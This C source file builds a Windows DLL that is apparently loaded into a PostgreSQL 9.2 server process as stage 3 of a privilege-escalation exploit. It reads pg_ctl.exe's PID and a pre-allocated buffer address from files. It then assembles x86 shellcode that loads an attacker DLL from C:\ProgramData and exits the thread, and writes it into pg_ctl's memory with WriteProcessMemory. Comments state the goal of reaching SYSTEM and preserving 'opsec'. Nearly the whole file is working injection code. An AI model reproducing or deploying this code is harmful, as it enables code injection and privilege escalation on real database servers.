// "c:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars32.bat"
// cl.exe /D_USRDLL /D_WINDLL /MT /Tc pgext3.cpp /link /DLL /out:pgext3.dll /SUBSYSTEM:CONSOLE /MACHINE:x86

#include "dll.h"
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#pragma comment(lib,"user32.lib")
#pragma comment(lib,"kernel32.lib")
#pragma comment(lib,"advapi32.lib")

	
HANDLE log_file = NULL;
DWORD bytesWritten = 0;
DWORD bytesRead = 0;
BOOL verbose_output = TRUE;
DWORD pgctl_pid = 0;
DWORD bufferSize = 1024; // won't be more

void log_msg(const char * line)
{
	if(verbose_output) WriteFile(log_file,line,strlen(line),&bytesWritten, NULL);
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    if(ul_reason_for_call != DLL_PROCESS_ATTACH) return 0; // only execute this once, during process attach (we don't want this to run twice)
	if(verbose_output)
	{
		log_file = CreateFileA("C:\\Program Files (x86)\\PostgreSQL\\9.2\\data\\ext.log", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); // create the log
		if (log_file != INVALID_HANDLE_VALUE)
		{
			SetFilePointer(log_file, 0, NULL, FILE_END);
		}
	}
	// first, obtain the PID of the pg_ctl.exe process, because that's where we have to inject our shellcode, as we are currently in one of the postgres.exe processes, which all have weak primary tokens that do not hold SeImpersonate privilege and thus won't allow us to escalate to SYSTEM
	HANDLE pid_file = CreateFileA("C:\\Program Files (x86)\\PostgreSQL\\9.2\\data\\ext.pid", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(pid_file==INVALID_HANDLE_VALUE)
	{
		log_msg("Cannot open PID file. Exiting.\n");
		if(verbose_output) CloseHandle(log_file);	
		return 0;
	}
	ReadFile(pid_file,&pgctl_pid,sizeof(pgctl_pid),&bytesRead,NULL);
	CloseHandle(pid_file);
	
    if (!pgctl_pid) {		
        log_msg("Process PID not found in the log.\n");
		if(verbose_output) CloseHandle(log_file);
        return 1;
    }
	else
	{
		char msg[100];
		snprintf(msg,sizeof(msg),"PID found (ext3) in the log: %d\n",pgctl_pid);
		log_msg(msg);		
	
		// we already have the buffer allocated, now we need to retrieve its address from the file
		// so first we need to recover it
		LPVOID remoteBuffer = NULL;
		HANDLE ptr_file = CreateFileA("C:\\Program Files (x86)\\PostgreSQL\\9.2\\data\\buff.addr", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);		
		if(ptr_file==INVALID_HANDLE_VALUE)
		{	
			log_msg("Cannot open PTR file (ext3). Exiting.\n");
			if(verbose_output) CloseHandle(log_file);	
			return 0;
		}		
		DWORD ptrAsInt = 0;
		ReadFile(ptr_file,&ptrAsInt,sizeof(DWORD),&bytesRead,NULL);
		CloseHandle(ptr_file);	
		remoteBuffer = (LPVOID)ptrAsInt;
				

		snprintf(msg,sizeof(msg),"Remote buffer address read from the ptr file (ext3): %p\n",remoteBuffer);
		log_msg(msg);			
		// OK, now, conduct phase 3 of the injection process, now we write into it.
		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pgctl_pid);
		if (!hProcess) {
			log_msg("Failed to open process.\n");
			printf("LAST ERROR: %d",GetLastError());
			return 0;
		}
		

// SHELLCODE GOES HERE
// WE WILL HAVE TO MOVE ALL THE FUNCTION LOOKUPS INTO A SEPARATE DLL (pgext0.dll), they will be saved and retrieved from a separate file, we will use a structure of pointers for this purpose
		HMODULE hKernel32 = LoadLibraryA("kernel32.dll");	// if this is not already loaded, we will fail, as we can't run code like this from within DllMain() - if this doesn't work, we will have to turn this into a valid postgresql extension code!
		if (!hKernel32) {
			log_msg("Failed to load kernel32.dll\n");
			return 1;
		}
		// Resolve the address of CreateProcessA
		LPVOID pLoadLibrary = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryA");
		if (!pLoadLibrary) {
			log_msg("Failed to get the address of LoadLibraryA\n");
			FreeLibrary(hKernel32);
			return 1;
		}
		memset(msg,0,sizeof(msg));
		snprintf(msg,sizeof(msg),"Address of LoadLibraryA() function: %p\n",pLoadLibrary);
		log_msg(msg);

		LPVOID pExitThread = (LPVOID)GetProcAddress(hKernel32, "ExitThread");
		if (!pExitThread) {
			log_msg("Failed to get the address of ExitThread\n");			
			// we don't exit in this case, the exploit will stil work, but it will crash the service afterwards
		}
		memset(msg,0,sizeof(msg));
		snprintf(msg,sizeof(msg),"Address of ExitThread() function: %p\n",pExitThread);
		log_msg(msg);		
		FreeLibrary(hKernel32);
	
		// first, we have a mov $ADDR,%eax instruction, where $ADDR is the dynamically imprinted address of LoadLIbraryA(), so we can eventually call %eax
		// then we have a series of push instructions that pushes the full path to the DLL onto the stack, so this second part will change, including its length, now it's C:\Users\Public\raw2.dll
		BYTE loadlibrary_shellcode[] = { 
			0xb8, 0x00, 0x00, 0x00, 0x00, // mov    $0x000000,%eax
			//0x6a, 0x00,                   // push   $0x0 string termination nullbyte			
			//00000000: 433a 5c55 7365 7273 5c50 7562 6c69 635c  C:\Users\Public\
			//00000010: 7261 7732 2e64 6c6c 0a                   raw2.dll.
			//0x68, 0x2e,	0x64, 0x6c,	0x6c, // push  ".dll" 
			//0x68, 0x72, 0x61 ,0x77,	0x32, // push   "raw2"
			//0x68, 0x6c, 0x69, 0x63, 0x5c, // push   "lic\"
			//0x68, 0x5c, 0x50, 0x75, 0x62, // push   "\Pub"
			//0x68, 0x73, 0x65, 0x72, 0x73, // push   "sers"
			//0x68, 0x43, 0x3a, 0x5c, 0x55, // push   "C:\U"
			// now it's C:\ProgramData\Comms\pged.dll
			0x68, 0x6c, 0x00, 0x00, 0x00, // push "l"+0x00 0x00 0x00
			0x68, 0x64, 0x2e, 0x64, 0x6c, // push "d.dl"
			0x68, 0x5c, 0x70, 0x67, 0x65, // push "\pge"
			0x68, 0x6f, 0x6d, 0x6d, 0x73, // push "omms"
			0x68, 0x74, 0x61, 0x5c, 0x43, // push "ta\C"
			0x68, 0x61, 0x6d, 0x44, 0x61, // push "amDa"
			0x68, 0x72, 0x6f, 0x67, 0x72, // push "rogr"
			0x68, 0x43, 0x3a, 0x5c, 0x50, //  push "C:\P"						
			0x54,	// push %esp
			0xff, 0xd0 // call *%eax
		}; 
		BYTE exit_thread[] = {
			0xb8, 0x00, 0x00, 0x00, 0x00, // mov    $0x000000,%eax
			0x6a, 0x00, // push $0x0 - the exit code we provide as the argument to ExitThread(0)
			0xff, 0xd0 // call *%eax
		};
		BYTE final_shellcode[1024];
		memset(final_shellcode,0,sizeof(final_shellcode));
		
		// now, let's write the LoadLibraryA() pointer into the shellcode (mov $ADDR,%eax instruction)
		DWORD ptrAsUint = (DWORD)pLoadLibrary;
		char * ptr = (char*)&ptrAsUint;
		loadlibrary_shellcode[1]=ptr[0];  // we fill 00s (which are just placeholders) with the actual bytes of the address
		loadlibrary_shellcode[2]=ptr[1];
		loadlibrary_shellcode[3]=ptr[2];
		loadlibrary_shellcode[4]=ptr[3];
		
		// now, let's write the ExitThread() pointer into the shellcode (mov $ADDR,%eax instruction)
		ptrAsUint = (DWORD)pExitThread;
		ptr = (char*)&ptrAsUint;		
		exit_thread[1]=ptr[0]; // we fill 00s (which are just placeholders) with the actual bytes of the address
		exit_thread[2]=ptr[1];
		exit_thread[3]=ptr[2];
		exit_thread[4]=ptr[3];
		
		// for debugging purposes, we might want to write this buffer out
		memset(msg,0,sizeof(msg));
		snprintf(msg,sizeof(msg),"First 5 bytes of the loadlibrary shellcode now: %.2x %.2x %.2x %.2x %.2x\n",loadlibrary_shellcode[0],loadlibrary_shellcode[1],loadlibrary_shellcode[2],loadlibrary_shellcode[3],loadlibrary_shellcode[4]); // b8 70 ea f7 5
		log_msg(msg);
		memset(msg,0,sizeof(msg));
		snprintf(msg,sizeof(msg),"First 5 bytes of exit_thread shellcode now: %.2x %.2x %.2x %.2x %.2x\n",exit_thread[0],exit_thread[1],exit_thread[2],exit_thread[3],exit_thread[4]); // b8 70 ea f7 5
		log_msg(msg);		
		
		// concatenate loadlibrary_shellcode and exit_thread
		memcpy(final_shellcode,loadlibrary_shellcode,sizeof(loadlibrary_shellcode));
		memcpy(final_shellcode+sizeof(loadlibrary_shellcode),exit_thread,sizeof(exit_thread));
		SIZE_T bufferSize = sizeof(loadlibrary_shellcode)+sizeof(exit_thread);
		
		// 
		if (!WriteProcessMemory(hProcess, remoteBuffer, final_shellcode, bufferSize, &bytesWritten)) {
			log_msg("Failed to write to process memory.\n");
			//VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE); // we don't want this to mess up our opsec
			
			return 0;
		}
		CloseHandle(hProcess);
		log_msg("Payload delivered, ext3 completed.\n");
		if(verbose_output) CloseHandle(log_file);	
	}
    return 0;
}